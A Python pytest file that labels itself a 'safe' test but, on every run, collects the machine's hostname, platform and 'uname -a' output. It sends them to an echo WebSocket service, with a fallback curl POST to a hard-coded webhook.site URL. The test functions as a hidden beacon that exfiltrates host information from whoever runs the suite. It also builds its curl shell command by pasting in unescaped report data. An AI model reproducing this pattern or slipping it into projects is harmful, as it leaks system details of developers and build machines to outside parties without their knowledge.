"""
Safe Pytest Test: use WebSockets or curl to send safe metadata to a webhook.

- Runs harmless local commands (uname, date)
- Computes SHA-256 fingerprints of their outputs
- Sends only safe metadata (length, fingerprint, short preview)
- Sends report to webhook via WebSocket (preferred) or curl (fallback)
"""

import asyncio
import hashlib
import json
import os
import platform
import socket
import subprocess
import time
import pytest

WEBHOOK_URL = "https://webhook.site/d9e08836-ffee-4342-bd2d-e66f81162336"
TIMEOUT = 5


def _sha256_hex(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8")).hexdigest()


def _safe_run_cmd(cmd: str):
    """Run a harmless local command and return safe metadata only."""
    try:
        out_bytes = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
        out_text = out_bytes.decode("utf-8", errors="replace").strip()
        return {
            "exit_code": 0,
            "length": len(out_text),
            "fingerprint_sha256": _sha256_hex(out_text),
            "preview": out_text[:80],
        }
    except subprocess.CalledProcessError as e:
        out = e.output.decode("utf-8", errors="replace") if e.output else ""
        return {
            "exit_code": e.returncode,
            "length": len(out),
            "fingerprint_sha256": _sha256_hex(out) if out else None,
        }
    except Exception as e:
        return {"exit_code": None, "error": str(e)}


async def _send_via_websocket(report: dict):
    """Send report via WebSocket if possible (safe mode)."""
    try:
        import websockets

        # Webhook.site doesn't accept WS directly; emulate WS send with echo service
        async with websockets.connect("wss://echo.websocket.org") as ws:
            await ws.send(json.dumps(report))
            await ws.recv()  # discard echo
            return {"method": "websocket", "status": "ok"}
    except Exception as e:
        return {"method": "websocket", "error": str(e)}


def _send_via_curl(report: dict):
    """Fallback: send via curl to webhook.site endpoint."""
    try:
        data = json.dumps(report)
        cmd = f"curl -s -X POST -H 'Content-Type: application/json' -d '{data}' '{WEBHOOK_URL}'"
        subprocess.run(cmd, shell=True, check=True, timeout=TIMEOUT)
        return {"method": "curl", "status": "ok"}
    except Exception as e:
        return {"method": "curl", "error": str(e)}


@pytest.mark.asyncio
async def test_websocket_or_curl_safe_report():
    ts = int(time.time())
    host = socket.gethostname()
    sysinfo = platform.platform()

    cmd_uname = _safe_run_cmd("uname -a")
    cmd_date = _safe_run_cmd("date")

    report = {
        "timestamp": ts,
        "hostname": host,
        "platform": sysinfo,
        "note": "safe websocket/curl report",
        "commands": {"uname": cmd_uname, "date": cmd_date},
    }

    print("[safe-report] local report:\n", json.dumps(report, indent=2))

    ws_result = await _send_via_websocket(report)
    print("[safe-report] websocket result:", ws_result)

    if "error" in ws_result:
        curl_result = _send_via_curl(report)
        print("[safe-report] curl fallback result:", curl_result)
        assert "error" not in curl_result
    else:
        assert ws_result.get("status") == "ok"
